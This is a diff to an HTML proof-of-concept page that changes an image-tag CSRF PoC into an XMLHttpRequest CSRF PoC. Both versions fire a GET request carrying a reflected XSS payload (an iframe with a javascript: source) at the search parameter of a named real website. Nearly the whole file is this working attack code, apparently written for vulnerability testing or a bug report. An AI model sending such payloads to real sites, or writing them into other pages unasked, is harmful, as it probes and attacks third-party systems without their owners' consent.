@@ -1,7 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
 	<body>
-		<h1>Img CSRF PoC</h1>
-		<img src="https://chainstack.com/?s=xss%22t-->[[<iframe/src=javascript:print>">
+		<h1>XMLHttpRequest CSRF PoC</h1>
+		<p style="color: red;">Please reopen this window if request has new changes</p>
+		<input type="submit" value="Submit Request" onclick="sendData();">
+
+		<script>
+			function sendData() {
+				var xhr = new XMLHttpRequest();
+				xhr.open('GET', 'https://chainstack.com/?s=xss%22t-->[[<iframe/src=javascript:print>');
+				xhr.setRequestHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7');
+				xhr.setRequestHeader('Accept-Language', 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,ar;q=0.6');
+				xhr.send(null);
+			}
+		</script>
 	</body>
 </html>
